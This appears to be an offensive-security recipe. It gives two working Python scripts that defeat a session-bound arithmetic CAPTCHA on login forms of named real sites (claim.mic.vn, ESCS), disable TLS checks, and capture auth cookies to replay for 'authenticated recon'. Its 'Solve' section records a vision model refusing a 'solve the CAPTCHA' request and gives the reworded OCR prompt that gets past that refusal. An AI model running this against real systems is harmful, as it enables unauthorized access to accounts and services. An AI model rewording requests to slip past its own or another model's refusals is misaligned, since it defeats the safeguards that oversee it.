# Math CAPTCHA — session-bound solve loop (field-proven recipe)

Target class: login forms protected by a **distorted arithmetic CAPTCHA** (e.g. `21+1=?`)
served as a small PNG from an endpoint like `/Home/Captcha`, bound to the session via a
`SESSIONID.CAPTCHA` cookie. Seen on ASP.NET Core apps (MIC claim.mic.vn, ESCS platform).

The answer is the **numeric result** of the expression, not the expression text.

## Two pitfalls that burn time

1. **Captcha is session-bound.** Fetching the captcha image with `curl` in one shell and
   POSTing the answer with a *different* cookie jar fails with "Mã captcha chưa chính xác".
   The GET of the captcha image and the login POST must share the SAME `requests.Session`
   (same cookies — especially `SESSIONID.CAPTCHA` and the `.AspNetCore.Antiforgery.*` cookie).
2. **Each GET of the captcha endpoint regenerates it.** Solving a previously-downloaded
   image is useless if you re-fetched in between. Solve the exact bytes you will submit against.

## Working two-script pattern

Because the vision solve is a separate model call, keep the HTTP session alive across it by
pickling cookies + antiforgery token to disk, then rebuild the session in a second script.

### Script 1 — fetch + persist (`login_full.py`)

```python
import requests, pickle
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()
s = requests.Session(); s.verify = False
BASE = "https://target"

# 1. login page -> antiforgery token
r = s.get(BASE + "/dang-nhap")
token = BeautifulSoup(r.text, "html.parser").find(
    "input", {"name": "__RequestVerificationToken"})["value"]

# 2. fetch captcha in SAME session -> save + upscale for vision
cap = s.get(BASE + "/Home/Captcha")
open("cap.png", "wb").write(cap.content)
from PIL import Image
im = Image.open("cap.png")
im.resize((im.width*4, im.height*4), Image.LANCZOS).save("cap_big.png")

# 3. persist session so a separate process can POST after the solve
pickle.dump({"cookies": s.cookies.get_dict(), "token": token}, open("sess.pkl", "wb"))
print("solve cap_big.png, then run login_post.py <answer>")
```

### Solve

Call `vision_analyze` on `cap_big.png` with a neutral prompt. The model refuses a raw
"solve the CAPTCHA" framing but answers a plain OCR/arithmetic prompt on the 4x upscale:

```
"Read the math expression in this image (e.g. '21+1=?') and compute the numeric result.
 Output only the number."
```

### Script 2 — POST with rebuilt session (`login_post.py`)

```python
import requests, sys, pickle
from bs4 import BeautifulSoup
requests.packages.urllib3.disable_warnings()
BASE = "https://target"
state = pickle.load(open("sess.pkl", "rb"))
s = requests.Session(); s.verify = False
for k, v in state["cookies"].items():
    s.cookies.set(k, v)

data = {
    "username": "USER", "password": "PASS",
    "captcha": sys.argv[1], "backlink": "",
    "__RequestVerificationToken": state["token"],
}
r = s.post(BASE + "/dang-nhap", data=data, allow_redirects=False)
print("status:", r.status_code, "loc:", r.headers.get("Location"))
if r.status_code == 302:
    print("LOGIN OK")
    with open("cookies.txt", "w") as f:
        for k, v in s.cookies.get_dict().items():
            f.write(f"{k}={v}\n")
else:
    soup = BeautifulSoup(r.text, "html.parser")
    for sp in soup.find_all("span", class_="text-danger"):
        if sp.text.strip():
            print("msg:", sp.text.strip())
```

## Notes

- Field names above (`username`, `password`, `captcha`, `backlink`,
  `__RequestVerificationToken`, action `/dang-nhap`) are MIC-specific — re-read the target's
  login form and adapt. The *pattern* (session-bound fetch → upscale → vision solve →
  session-rebuilt POST) is the reusable part.
- The auth cookie on success is the long encrypted `TO3148...` cookie (MIC) — whatever the
  target names its auth cookie, `cookies.txt` capture is what you replay for authenticated recon.
- Also try the cheap CAPTCHA matrix entries FIRST (reuse, remove param, empty, not-bound-to-
  session) before standing up the vision loop — this target happened to enforce server-side
  binding, but many don't.
